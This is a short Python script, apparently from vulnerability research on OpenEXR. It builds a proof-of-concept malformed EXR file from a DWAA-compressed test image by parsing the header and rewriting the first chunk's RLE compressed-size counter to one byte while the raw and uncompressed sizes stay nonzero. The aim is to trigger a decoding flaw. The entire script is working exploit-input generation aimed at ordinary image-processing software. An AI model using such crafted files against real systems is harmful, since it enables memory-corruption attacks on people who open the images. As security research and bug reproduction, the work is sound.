from pathlib import Path
import struct, json, os
src=Path('/workspace/repo-vul/src-vul/src/test/OpenEXRTest/comp_dwaa_v1.exr')
data=bytearray(src.read_bytes())
# parse header end
pos=8
while data[pos]!=0:
    ne=data.index(0,pos); pos=ne+1
    te=data.index(0,pos); pos=te+1
    sz=struct.unpack_from('<I', data, pos)[0]; pos+=4+sz
pos+=1
# first chunk offset from offset table
chunk_off=struct.unpack_from('<Q', data, pos)[0]
chunk_data=chunk_off+8
counters=list(struct.unpack_from('<'+'Q'*11, data, chunk_data))
print('headerend',pos,'chunk',chunk_off,'counters before',counters)
# reduce RLE compressed size to one input byte while keeping rleRawSize/rleUncompressedSize nonzero
counters[5]=1
struct.pack_into('<'+'Q'*11, data, chunk_data, *counters)
out=Path('/workspace/poc_dwa_rle_1byte.exr')
out.write_bytes(data)
print('wrote',out, out.stat().st_size, 'counters after', struct.unpack_from('<'+'Q'*11, data, chunk_data))
